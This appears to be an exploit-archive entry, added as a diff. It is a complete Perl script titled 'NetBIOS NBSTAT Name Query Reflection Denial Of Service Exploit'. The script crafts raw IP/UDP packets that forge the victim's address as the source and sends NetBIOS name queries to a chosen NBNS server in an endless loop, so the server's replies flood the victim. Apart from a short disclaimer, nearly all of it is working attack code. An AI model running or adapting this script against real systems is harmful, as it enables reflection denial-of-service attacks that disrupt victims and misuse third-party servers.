@@ -1,0 +1,159 @@
+id: 23911
+date: 07/21/2015
+title: NetBIOS NBSTAT Name Query Reflection Denial Of Service Exploit
+author: Todor Donev
+cves: 
+
+#!/usr/bin/perl
+#
+#  NetBios NBSTAT name query reflection dos
+#
+#  Copyright 2015 (c) Todor Donev 
+#  todor.donev@gmail.com
+#  http://www.ethical-hacker.org/
+#  https://www.facebook.com/ethicalhackerorg
+#
+#  Disclaimer:
+#  This or previous program is for Educational
+#  purpose ONLY. Do not use it without permission.
+#  The usual disclaimer applies, especially the
+#  fact that Todor Donev is not liable for any
+#  damages caused by direct or indirect use of the
+#  information or functionality provided by these
+#  programs. The author or any Internet provider
+#  bears NO responsibility for content or misuse
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact
+#  that any damage (dataloss, system crash,
+#  system compromise, etc.) caused by the use
+#  of these programs is not Todor Donev's
+#  responsibility.
+#
+#  Use at your own risk and educational 
+#  purpose ONLY!
+#
+#  See also, UDP-based Amplification Attacks:
+#  https://www.us-cert.gov/ncas/alerts/TA14-017A
+#  http://www.rhyshaden.com/netbios.htm
+#
+
+use strict;
+use Socket;
+use warnings;
+no warnings 'uninitialized';
+
+if ( $< != 0 ) {
+   print "Sorry, must be run as root!\n";
+   print "This script use RAW Socket.\n"; 
+   exit;
+}
+
+my $nbns            = (gethostbyname($ARGV[0]))[4];         # IP Address Destination        (32 bits)
+my $victim          = (gethostbyname($ARGV[1]))[4];         # IP Address Source             (32 bits)
+
+print "[ NetBios NBSTAT name query reflection ddos\n";
+if (!defined $nbns || !defined $victim) {
+    print "[ Usg: $0 <nbns src> <victim>\n";
+    print "[ <todor.donev\@gmail.com> Todor Donev\n";
+    exit;
+}
+print "[ Sending NBNS packets: $ARGV[0] -> $ARGV[1]\n";
+socket(RAW, PF_INET, SOCK_RAW, 255) or die $!;
+setsockopt(RAW, 0, 1, 1) or die $!;
+main();
+
+    # Main program
+sub main {
+    my $packet;
+    
+    $packet = iphdr();
+    $packet .= udphdr();
+    $packet .= nbnshdr();
+    # b000000m...
+    send_packet($packet);
+}
+
+    # IP header (Layer 3)
+sub iphdr {
+    my $ip_ver           = 4;          # IP Version 4      (4 bits)
+    my $iphdr_len        = 5;          # IP Header Length    (4 bits)
+    my $ip_tos           = 0;          # Differentiated Services  (8 bits)
+    my $ip_total_len     = $iphdr_len + 20;      # IP Header Length + Data  (16 bits)
+    my $ip_frag_id       = 0;          # Identification Field    (16 bits)
+    my $ip_frag_flag     = 000;          # IP Frag Flags (R DF MF)  (3 bits)
+    my $ip_frag_offset   = 0000000000000;      # IP Fragment Offset    (13 bits)
+    my $ip_ttl           = 255;          # IP TTL      (8 bits)
+    my $ip_proto         = 17;          # IP Protocol      (8 bits)
+    my $ip_checksum      = 0;          # IP Checksum      (16 bits)
+
+    # IP Packet
+  my $iphdr  = pack(
+      'H2 H2 n n B16 h2 c n a4 a4',
+      $ip_ver . $iphdr_len, $ip_tos, 
+      $ip_total_len, $ip_frag_id, 
+      $ip_frag_flag . $ip_frag_offset,
+      $ip_ttl, $ip_proto, $ip_checksum,
+      $victim, $nbns
+      );
+      return $iphdr;
+}
+
+    # UDP Header (Layer 4)
+sub udphdr {
+    my $udp_src_port  = 31337;      # UDP Sort Port    (16 bits) (0-65535)
+    my $udp_dst_port  = 137;        # UDP Dest Port    (16 btis) (0-65535)
+    my $udp_len    = 8 + length(nbnshdr());  # UDP Length    (16 bits) (0-65535)
+    my $udp_checksum   = 0;        # UDP Checksum    (16 bits) (XOR of header)
+
+    # UDP Packet
+    my $udphdr    = pack(
+      'n n n n',
+      $udp_src_port, 
+      $udp_dst_port,
+      $udp_len, 
+      $udp_checksum
+      );
+  return $udphdr;
+}
+
+    # NetBios Name Service
+sub nbnshdr {
+
+    my $transid     = 0x03e8;
+    my $namequery   = 0x0010;
+    my $questions   = 0x0001;
+    my $answerrr   = 0x0000;    
+    my $authrr     = 0x0000;
+    my $adrr     = 0x0000;
+    
+    my $query     = "\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41";
+       $query    .= "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+       $query    .= "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00";
+        
+    my $type    = 0x0021;    
+    my $class    = 0x0001;
+
+    # NetBios packet
+    my $nbnshdr    = pack(
+                        'n n n n n n a* n n', 
+       $transid,
+                         $namequery,
+       $questions, 
+       $answerrr,
+                         $authrr,
+                         $adrr,
+                         $query,
+                         $type,
+                         $class
+      );
+return $nbnshdr;
+}
+
+sub send_packet {
+    while(1){
+    select(undef, undef, undef, 0.30);      # Sleep 300 milliseconds
+    send(RAW, $_[0], 0, pack('Sna4x8', AF_INET, 60, $nbns)) or die $!;
+   }
+}
+
+#  0day.today [2023-03-24]  #
